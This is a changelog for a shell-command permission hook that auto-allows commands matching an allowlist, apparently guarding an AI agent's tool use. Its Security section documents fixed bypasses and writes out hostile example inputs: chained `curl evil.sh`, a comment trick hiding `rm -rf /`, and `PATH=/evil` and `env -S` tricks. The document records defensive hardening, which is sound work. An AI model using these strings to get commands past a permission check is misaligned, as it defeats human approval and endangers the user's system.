# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security
- Fixed allowlist bypass (br-0hat): newline, single `&` and `|&` are now command separators, so every chained command must match the allowlist (previously `npm test\ncurl evil.sh` and `npm test & curl evil` auto-allowed under `Bash(npm test:*)`).
- Redirections to or from a path (`>`, `>>`, `<`, `&>`, `&>>`) and unmatched redirect targets now make the parser throw, so the hook falls back to the normal permission dialog instead of silently dropping the target. Conservatively still allowed: fd merging (`2>&1`, `>&2`, `2>&-`) and redirects to exactly `/dev/null`.
- Unquoted subshell/grouping parentheses now also defer to the permission dialog (command/process substitution and here-docs already did).
- A `#` that starts a word is now a comment that runs to the end of that line, so an apostrophe inside a comment can no longer swallow the rest of the command: `git status # don't run rm -rf /` previously matched `Bash(git:*)` and was auto-allowed. A command with an unbalanced quote now defers to the permission dialog instead of being classified from a guess.
- Wrapper options that cannot be parsed safely are refused: `env` only accepts `-i`, `-u NAME` and `VAR=value` assignments, so `env -C /tmp git status` (executable was mis-identified as `/tmp`), `env -S 'git status'`, `env -0`, `env -v`, `env --unset=PATH` and `env -PATH=/evil` no longer reach the allowlist.
- Leading `VAR=value` assignments that change `PATH`, `IFS`, `LD_*` or `DYLD_*` are refused instead of being silently dropped, so `PATH=/evil git status` and `IFS=$x git status` are no longer allowed as if the assignment were absent. `BASH_ENV` and `ENV` are refused for the same reason (a shell sources them before it runs anything).
- The same rule now applies to assignments inside a skipped command: `export PATH=/evil; git status`, `declare IFS=$x; git status` and `unset PATH; git status` are refused, while `export FOO=bar; git status` stays allowed.
- A `#` only starts a comment after a character the shell treats as a word separator (space, tab, newline) or after a command separator, so a `#` after a non-breaking space, vertical tab, form feed or carriage return no longer hides the rest of the line.
- ANSI-C quoting (`$'...'`) and locale quoting (`$"..."`) are not implemented by the tokenizer, so a command that uses them now defers to the permission dialog instead of being classified from a guess.

### Added
- Initial package structure
- Plugin manifest (plugin.json)
- Hook configuration (hooks.json)
- Main hook entrypoint (permitter.js)
- Environment variable configuration (ENSEMBLE_PERMITTER_DISABLE, PERMITTER_DEBUG, PERMITTER_STRICT)
- Stdin JSON parsing for hook data
- Exit code protocol (0 = allow, 1 = defer)
- Debug logging to stderr
- Stub modules for command-parser, allowlist-loader, and matcher
- README.md documentation
- CHANGELOG.md

## [1.0.0] - TBD

### Added
- Full command parsing with state machine tokenizer
- Operator detection and command splitting
- Environment variable and wrapper stripping
- Subshell extraction (bash -c)
- Settings file loading and merging
- Pattern matching implementation
- Comprehensive test suite
- Security hardening with adversarial tests
